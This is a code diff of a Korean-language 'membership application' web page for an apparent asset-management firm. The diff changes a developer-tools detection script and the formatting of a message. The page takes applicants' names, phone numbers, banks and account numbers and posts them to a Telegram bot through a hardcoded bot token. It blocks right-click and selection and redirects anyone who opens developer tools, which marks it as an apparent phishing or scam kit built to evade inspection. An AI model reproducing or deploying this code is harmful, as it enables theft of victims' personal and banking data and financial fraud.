@@ -54,17 +54,6 @@
         .form-group input:last-child {
             margin-right: 0; /* No margin for the last input on the right */
         }
-        .form-group button {
-            flex-basis: 100%;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        .form-group button:hover {
-            background-color: #0056b3;
-        }
 		.topimfo {
 			max-width: 960px;
 			margin: auto;
@@ -168,7 +157,7 @@
 </head>
 <body oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
     <div class="header">
-        <h1>베스트업 멤버십 신청 </h1>
+        <h1>베스트업 멤버십 신청 0</h1>
     </div>
 	<div class="topimfo">
 		베스트업 자산운용
@@ -213,45 +202,27 @@
 		<br>
 	</div>
     <script>
-		var devtools = { open: false, orientation: null };
-		var threshold = 160;
-		var emitEvent = (state, orientation) => {
-			window.dispatchEvent(new CustomEvent('devtoolschange', {
-				detail: {
-					open: state,
-					orientation: orientation
-				}
-			}));
-		};
-
-		setInterval(() => {
-			const widthThreshold = window.outerWidth - window.innerWidth > threshold;
-			const heightThreshold = window.outerHeight - window.innerHeight > threshold;
-			const orientation = widthThreshold ? 'vertical' : 'horizontal';
-
-			if (!(heightThreshold && widthThreshold) &&
-				((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
-				if (!devtools.open || devtools.orientation !== orientation) {
-					emitEvent(true, orientation);
-					devtools.open = true;
-					devtools.orientation = orientation;
-					alert("정상적으로 이용해주세요.3");
-					window.location.href = "https://www.google.com";
-				}
-			} else {
-				if (devtools.open) {
-					emitEvent(false, null);
-					devtools.open = false;
-					devtools.orientation = null;
-				}
-			}
-		}, 500);
-
-		if (typeof module !== 'undefined' && module.exports) {
-			module.exports = devtools;
-		} else {
-			window.devtools = devtools;
-		}
+        document.addEventListener("DOMContentLoaded", function() {
+            // Developer Tools Detection
+            var devtools = function() {
+                var devtoolsOpen = false;
+                var threshold = 160;
+                var checkDevTools = function() {
+                    if ((window.outerHeight - window.innerHeight > threshold) ||
+                        (window.outerWidth - window.innerWidth > threshold)) {
+                        if (!devtoolsOpen) {
+                            devtoolsOpen = true;
+                            alert('정상적으로 이용해주세요.');
+                            window.location.href = "https://www.google.com";
+                        }
+                    } else {
+                        devtoolsOpen = false;
+                    }
+                };
+                setInterval(checkDevTools, 500);
+            };
+            devtools();
+        });
 
         document.addEventListener("DOMContentLoaded", function() {
             if (!navigator.userAgent.toLowerCase().includes("chrome")) {
@@ -300,7 +271,7 @@
                 }
 
                 const message = `
-☆멤버십 신청 정보☆:\n
+☆멤버십 신청 정보☆\n
 ※접수날짜: ${data.date}\n
 ※이름: ${data.name}\n
 ※휴대폰 번호: ${data.phone}\n
@@ -311,7 +282,7 @@
 ※은행명: ${data.bank}\n
 ※예금주: ${data.accountHolder}\n
 ※계좌번호: ${data.accountNumber}\n
-                `;
+======================\n`;
 
 				const botToken = '7340037891:AAGRpEijtgsGHplWdDoVWo9mZiI90gGRab8';
 				const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
